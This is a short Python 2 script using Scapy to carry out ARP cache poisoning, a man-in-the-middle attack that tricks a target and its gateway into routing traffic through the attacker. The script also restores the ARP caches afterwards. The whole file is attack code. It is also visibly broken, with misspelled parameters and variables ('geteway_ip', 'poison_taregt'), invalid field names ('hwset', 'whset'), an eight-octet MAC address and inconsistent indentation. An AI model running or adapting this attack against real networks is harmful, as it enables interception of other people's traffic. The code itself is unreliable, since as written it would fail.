from scapy.all import *
import sys
import os
import signal

def restore_target(geteway_ip, gateway_mac, target_ip, target_mac):
	print "[*] Restoring target..."
	send(ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwset="ff:ff:ff:ff:ff:ff:ff:ff", hwsrc=gateway_mac), count=5)
	send(ARP(op=2, psrc=target_ip, pdst=gateway_ip, hwset="ff:ff:ff:ff:ff:ff:ff:ff", hwsrc=target_mac), count=5)

def get_mac(ip_address):
	responses, unanswered = srp(Ether(dst="ff:ff:ff:ff:ff:ff:ff:ff")/ARP(pdst=ip_address), timeout=2, retry=10)

	for s, r in responses:
		return r[Ether].src

	return None

def poison_target(gateway_ip, gateway_mac, target_ip, target_mac, stop_event):
       	poison_taregt = ARP()
        poison_target.op = 2
        poison_target.psrc = gateway_ip
        poison_target.pdst = target_ip
        poison_target.whset = target_mac

        poison_gateway = ARP()
        poison_gateway.op = 2
        poison_gateway.psrc = target_ip
        poison_gateway.pdst = gateway_ip
        poison_gateway.hwset = gateway_mac

        print "[*] Beginnnig the ARP poison. [CTRL-C to stop]"

        while True:
                send(poison_target)
                send(poison_gateway)

                if stop_event.wait(2):
                       	break

        print "[*] ARP poison attack finished."
       	return
